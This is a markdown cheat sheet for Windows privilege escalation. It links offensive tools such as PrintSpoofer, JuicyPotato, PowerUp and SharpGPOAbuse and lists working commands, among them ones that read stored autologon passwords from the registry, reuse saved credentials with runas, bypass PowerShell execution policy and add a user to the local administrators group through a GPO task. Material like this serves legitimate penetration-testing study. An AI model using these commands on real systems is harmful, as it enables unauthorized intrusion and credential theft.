# Window Privesc "Source Links"

## PrintSpoofer.exe
- Link
```
https://github.com/itm4n/PrintSpoofer
```

## JuicyPotato
- Link
```
https://github.com/ohpe/juicy-potato
```

## Powerup
- Link
```
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

powershell -ep bypass
.\PowerUp.ps1
Invoke-PrivescAudit
```

## PrivescCheck
- Link
```
https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1
```

## Powerview
- Link
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

## SharpHound
- Link
```
https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
```

## PowerGPOAbuse
- Link
```
https://github.com/rootSySdk/PowerGPOAbuse
https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/master/PowerGPOAbuse.ps1
```
- Usage
```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName 'noraj' --Author 'vulnnet\administrator' --Command "powershell.exe /c" --Arguments "net localgroup administrators enterprise-security /add" --GPOName "security-pol-vn"
```

## SharpGPOAbuse
- Link
```
wget https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe
```
___________________________________________________________________________________________________________________________________________________________________________________________________________________________

# Window Privesc Normal
## PowerUp
- Check Default Username and Password from Registry
```
reg query "HKLM\Software\Microsoft\Windows Nt\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\Software\Microsoft\Windows Nt\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\Software\Microsoft\Windows Nt\CurrentVersion\Winlogon" /v AutoAdminLogon
```

- Check the service that current user can modify
```
Get-ModifiableService
```

- Check the unquoted service name
```
Get-ServiceUnquoted
```

## PrivescCheck
- Load ps1 script and run 
```
powershell -ep bypass -c ". .\PrivescCheck.ps1;Invoke-PrivescCheck "
```

- Check window services for user escalating
```AInvoke-ServiceAudit
```

- Check outdated and potentially vulnerable software
```
Invoke-AuditInstalledPrograms
```
## Unattendend Installation Files

- Default File Location
```
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Autounattended.xml
```

## Window Credential Manager (Manual)
- Check Stored Credential
```
cmdkey /list
```

- Login using saved credentials ( can also run malicious shell.exe instead of cmd )
```
runas.exe /savecred /user:administrator cmd
```

## Powershell History
- Check history file location
```
C:\Users\student\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_History.txt
```

## Insecure Service Permissions 
- Check the vulnerable service with PowerUp, AccessChk or metasploit
- Check permissions by ACL or by all means
- Modify the service configuration
- Restart the service
```
Restart-Service -name "Service Name"
```

## Registry Autorun
- Check the auto run file permission
```
Get-Acl -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\run | Format-List
```
___________________________________________________________________________________________________________________________________________________________________________________________________________________________

# Advanced PrivESC Techniques

